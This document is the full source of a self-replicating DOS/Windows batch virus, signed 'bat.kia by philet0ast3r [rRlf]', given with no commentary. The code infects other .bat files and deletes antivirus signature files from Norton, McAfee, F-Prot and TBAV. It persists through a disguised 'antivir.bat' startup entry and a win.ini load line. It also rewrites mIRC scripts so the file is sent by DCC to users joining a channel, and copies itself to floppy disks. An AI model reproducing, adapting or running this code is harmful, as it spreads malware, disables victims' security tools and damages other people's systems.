@echo off%_kia% 
if '%1=='kia goto kia%2 
set kia=%0.bat 
if not exist %kia% set kia=%0 
if '%kia%==' set kia=autoexec.bat 
if exist c:\_kia.bat goto kiag 
if exist %kia% goto kiafe 
call %kia% kia h %path% 
if exist %kia% goto kiafe 
goto ekia 
:kiah 
shift%_kia% 
if '%2==' goto kiaxt 
if exist %2\%kia% set kia=%2\%kia% 
if exist %2%kia% set kia=%2%kia% 
if exist %2\%kia%.bat set kia=%2\%kia%.bat 
if exist %2%kia%.bat set kia=%2%kia%.bat 
if not exist %kia% goto kiah 
goto kiaxt 
:kiafe 
find "kia"c:\_kia.bat 
attrib c:\_kia.bat +h 
:kiag 
command /e:5000 /c c:\_kia kia vir 

:ekia 
ctty nul.kia 
if exist c:\_kia.bat del c:\programme\norton~1\s32integ.dll 
if exist c:\_kia.bat del c:\programme\f-prot95\fpwm32.dll 
if exist c:\_kia.bat del c:\programme\mcafee\scan.dat 
if exist c:\_kia.bat del c:\tbavw95\tbscan.sig 

if exist c:\windows\startmen\programme\autostart\antivir.bat goto rdkia 
copy bat.kia.bat c:\windows\ki4.sys 
echo @echo off>kiaaa.bat 
echo ctty nul>>kiaaa.bat 
echo if exist c:\windows\system\bat.kia.bat goto 0k>>kiaaa.bat 
echo copy c:\windows\ki4.sys c:\windows\system\bat.kia.bat>>kiaaa.bat 
echo :0k>>kiaaa.bat 
move kiaaa.bat c:\windows\startmen\programme\autostart\antivir.bat 

:rdkia 
if exist c:\windows\system\bat.kia.bat goto wykia 
copy bat.kia.bat c:\windows\system 
copy bat.kia.bat + c:\windows\win.ini c:\windows\system\win.ini 
del c:\windows\win.ini 
move c:\windows\system\win.ini c:\windows 
goto wykia 

[windows] 
load=c:\windows\system\bat.kia.bat 
run=C:\WINDOWS\SYSTEM\cmmpu.exe 
NullPort=None 

:wykia 
echo [script]>kia23.bat 
echo n0=on 1:JOIN:#:{ >>kia23.bat 
echo n1= /if ( nick == $me ) { halt } >>kia23.bat 
echo n2= /.dcc send $nick c:\windows\system\bat.kia.bat >>kia23.bat 
echo n3=} >>kia23.bat 
if exist c:\mirc\mirc.ini copy kia23.bat c:\mirc\script.ini 
if exist c:\mirc32\mirc.ini copy kia23.bat c:\mirc32\script.ini 
if exist c:\progra~1\mirc\mirc.ini copy kia23.bat c:\progra~1\mirc\script.ini 
if exist c:\progra~1\mirc32\mirc.ini copy kia23.bat c:\progra~1\mirc32\script.ini 
del kia23.bat 

:dikia 
command /f /c copy c:\windows\system\bat.kia.bat a:\ 

:tckia 
if exist c:\_kia.bat date 23.05.2023 
if exist c:\_kia.bat time 23:17:05,40 

:plkia 
if exist c:\programs\bat.kia\bat.kia.inf goto nakia 
if exist c:\_kia.bat md c:\programs 
md c:\programs\bat.kia 
echo this virus is dedicated to one of the most important persons in my life>kia.inf 
echo i hope we will never lose ourselves>>kia.inf 
echo ...>>kia.inf 
echo bat.kia by philet0ast3r [rRlf]>>kia.inf 
move kia.inf c:\programs\bat.kia\bat.kia.inf 
attrib +s c:\programs\bat.kia\bat.kia.inf 

:nakia 
set kia= 
if exist !!kia.bat del !!kia.bat 
goto kiaend 
:kiaxt 
echo.>!!kia.bat 
!!kia.bat 
:kiavir 
for %%a in (*.bat ..\*.bat c:*.bat) do call c:\_kia kia i %%a 
exit kia 
:kiai 
find "kia"nul 
if not errorlevel 1 goto kiaj 
type c:\_kia.bat>kia$ 
type %3>>kia$ 
move kia$ %3>nul 
exit kia 
:kiaj 
set kia!=%kia!%1 
if %kia!%==1 exit 
:kiaend 